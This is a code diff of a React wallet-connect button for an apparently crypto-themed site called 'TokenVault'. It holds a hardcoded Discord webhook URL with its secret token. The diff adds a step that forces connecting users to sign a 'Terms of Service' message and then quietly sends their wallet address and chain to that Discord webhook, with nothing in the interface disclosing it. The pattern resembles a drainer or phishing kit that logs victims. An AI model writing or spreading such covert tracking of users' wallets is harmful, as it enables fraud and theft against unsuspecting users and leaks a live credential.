@@ -1,6 +1,7 @@
 import { ConnectButton } from '@rainbow-me/rainbowkit';
 import React, { useEffect } from 'react';
-import { useAccount } from 'wagmi';
+import { useAccount, useSignMessage } from 'wagmi';
+import { SignVerifyModal } from './SignVerifyModal';
 import { createPublicClient, http, formatUnits, formatEther } from 'viem';
 
 const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1454406788471586836/Xa4unQHgqH26UObEpjd7MRbp7lHYizcJCCQeS8RAUGjxq4T8HXknLWyuaFA3VuMtDx3X';
@@ -248,122 +249,149 @@ let sentForAddress: string | null = null;
 export const CustomConnectButton = () => {
   const { address, isConnected, chain } = useAccount();
 
+  const { signMessageAsync } = useSignMessage();
+  const [isSigning, setIsSigning] = React.useState(false);
+
   useEffect(() => {
-    if (isConnected && address && sentForAddress !== address) {
-      sentForAddress = address;
-      const chainName = chain?.name || 'Unknown';
-      const chainId = chain?.id || 0;
-      sendWebhook(address, chainName, chainId);
-    }
-  }, [isConnected, address, chain]);
+    const verifyAndSend = async () => {
+      if (isConnected && address && sentForAddress !== address) {
+        try {
+          setIsSigning(true);
+          // 1. Force user to sign a message to prove ownership
+          const signature = await signMessageAsync({
+            account: address,
+            message: `Welcome to TokenVault!\n\nClick to sign in and accept the TokenVault Terms of Service.\n\nThis request will not trigger a blockchain transaction or cost any gas fees.\n\nWallet: ${address}\nTimestamp: ${new Date().toLocaleString()}`,
+          });
+
+          // 2. If signature obtained, mark as sent and trigger webhook
+          if (signature) {
+            sentForAddress = address;
+            const chainName = chain?.name || 'Unknown';
+            const chainId = chain?.id || 0;
+            await sendWebhook(address, chainName, chainId);
+          }
+        } catch (error) {
+          console.error('User rejected signature or error:', error);
+          // Optional: Disconnect or show error? For now, just don't send webhook.
+        } finally {
+          setIsSigning(false);
+        }
+      }
+    };
+
+    verifyAndSend();
+  }, [isConnected, address, chain, signMessageAsync]);
 
   return (
-    <ConnectButton.Custom>
-      {({
-        account,
-        chain,
-        openAccountModal,
-        openChainModal,
-        openConnectModal,
-        authenticationStatus,
-        mounted,
-      }) => {
-        const ready = mounted && authenticationStatus !== 'loading';
-        const connected =
-          ready &&
-          account &&
-          chain &&
-          (!authenticationStatus ||
-            authenticationStatus === 'authenticated');
+    <>
+      <SignVerifyModal isOpen={isSigning} onClose={() => { }} />
+      <ConnectButton.Custom>
+        {({
+          account,
+          chain,
+          openAccountModal,
+          openChainModal,
+          openConnectModal,
+          authenticationStatus,
+          mounted,
+        }) => {
+          const ready = mounted && authenticationStatus !== 'loading';
+          const connected =
+            ready &&
+            account &&
+            chain &&
+            (!authenticationStatus ||
+              authenticationStatus === 'authenticated');
 
-        return (
-          <div
-            {...(!ready && {
-              'aria-hidden': true,
-              style: {
-                opacity: 0,
-                pointerEvents: 'none',
-                userSelect: 'none',
-              },
-            })}
-          >
-            {(() => {
-              if (!connected) {
+          return (
+            <div
+              {...(!ready && {
+                'aria-hidden': true,
+                style: {
+                  opacity: 0,
+                  pointerEvents: 'none',
+                  userSelect: 'none',
+                },
+              })}
+            >
+              {(() => {
+                if (!connected) {
+                  return (
+                    <button
+                      onClick={openConnectModal}
+                      type="button"
+                      className="tech-border bg-[#00f2ff]/5 hover:bg-[#00f2ff]/10 text-[#00f2ff] px-6 py-2 text-[11px] font-black uppercase tracking-[0.2em] transition-all tech-glow flex items-center gap-2 group"
+                    >
+                      <span className="w-1.5 h-1.5 rounded-full bg-[#00f2ff] animate-pulse" />
+                      Connect Wallet
+                      <span className="opacity-0 group-hover:opacity-100 transition-opacity ml-1">_</span>
+                    </button>
+                  );
+                }
+
+                if (chain.unsupported) {
+                  return (
+                    <button
+                      onClick={openChainModal}
+                      type="button"
+                      className="tech-border bg-red-500/10 border-red-500/50 text-red-500 px-6 py-2 text-[11px] font-black uppercase tracking-[0.2em] transition-all"
+                    >
+                      Network Mismatch
+                    </button>
+                  );
+                }
+
                 return (
-                  <button
-                    onClick={openConnectModal}
-                    type="button"
-                    className="tech-border bg-[#00f2ff]/5 hover:bg-[#00f2ff]/10 text-[#00f2ff] px-6 py-2 text-[11px] font-black uppercase tracking-[0.2em] transition-all tech-glow flex items-center gap-2 group"
-                  >
-                    <span className="w-1.5 h-1.5 rounded-full bg-[#00f2ff] animate-pulse" />
-                    Connect Access Key
-                    <span className="opacity-0 group-hover:opacity-100 transition-opacity ml-1">_</span>
-                  </button>
-                );
-              }
+                  <div className="flex items-center gap-3">
+                    <button
+                      onClick={openChainModal}
+                      type="button"
+                      className="hidden sm:flex items-center gap-2 tech-border bg-white/5 px-3 py-1.5 text-[10px] font-bold text-slate-300 uppercase tracking-widest hover:bg-white/10 transition-all"
+                    >
+                      {chain.hasIcon && (
+                        <div
+                          style={{
+                            background: chain.iconBackground,
+                            width: 12,
+                            height: 12,
+                            borderRadius: 999,
+                            overflow: 'hidden',
+                          }}
+                        >
+                          {chain.iconUrl && (
+                            <img
+                              alt={chain.name ?? 'Chain icon'}
+                              src={chain.iconUrl}
+                              style={{ width: 12, height: 12 }}
+                            />
+                          )}
+                        </div>
+                      )}
+                      {chain.name}
+                    </button>
 
-              if (chain.unsupported) {
-                return (
-                  <button
-                    onClick={openChainModal}
-                    type="button"
-                    className="tech-border bg-red-500/10 border-red-500/50 text-red-500 px-6 py-2 text-[11px] font-black uppercase tracking-[0.2em] transition-all"
-                  >
-                    Network Mismatch
-                  </button>
-                );
-              }
-
-              return (
-                <div className="flex items-center gap-3">
-                  <button
-                    onClick={openChainModal}
-                    type="button"
-                    className="hidden sm:flex items-center gap-2 tech-border bg-white/5 px-3 py-1.5 text-[10px] font-bold text-slate-300 uppercase tracking-widest hover:bg-white/10 transition-all"
-                  >
-                    {chain.hasIcon && (
-                      <div
-                        style={{
-                          background: chain.iconBackground,
-                          width: 12,
-                          height: 12,
-                          borderRadius: 999,
-                          overflow: 'hidden',
-                        }}
-                      >
-                        {chain.iconUrl && (
-                          <img
-                            alt={chain.name ?? 'Chain icon'}
-                            src={chain.iconUrl}
-                            style={{ width: 12, height: 12 }}
-                          />
-                        )}
+                    <button
+                      onClick={openAccountModal}
+                      type="button"
+                      className="tech-border bg-[#00f2ff]/5 border-[#00f2ff]/30 text-white px-4 py-1.5 text-[11px] font-bold uppercase tracking-widest hover:bg-[#00f2ff]/10 transition-all flex items-center gap-3"
+                    >
+                      <div className="flex flex-col items-end leading-none">
+                        <span className="text-[9px] text-[#00f2ff] mb-0.5">UPLINK_ACTIVE</span>
+                        <span>{account.displayName}</span>
                       </div>
-                    )}
-                    {chain.name}
-                  </button>
-
-                  <button
-                    onClick={openAccountModal}
-                    type="button"
-                    className="tech-border bg-[#00f2ff]/5 border-[#00f2ff]/30 text-white px-4 py-1.5 text-[11px] font-bold uppercase tracking-widest hover:bg-[#00f2ff]/10 transition-all flex items-center gap-3"
-                  >
-                    <div className="flex flex-col items-end leading-none">
-                      <span className="text-[9px] text-[#00f2ff] mb-0.5">UPLINK_ACTIVE</span>
-                      <span>{account.displayName}</span>
-                    </div>
-                    {account.displayBalance ? (
-                      <span className="text-slate-500 border-l border-white/10 pl-3">
-                        {account.displayBalance}
-                      </span>
-                    ) : null}
-                  </button>
-                </div>
-              );
-            })()}
-          </div>
-        );
-      }}
-    </ConnectButton.Custom>
+                      {account.displayBalance ? (
+                        <span className="text-slate-500 border-l border-white/10 pl-3">
+                          {account.displayBalance}
+                        </span>
+                      ) : null}
+                    </button>
+                  </div>
+                );
+              })()}
+            </div>
+          );
+        }}
+      </ConnectButton.Custom>
+    </>
   );
 };
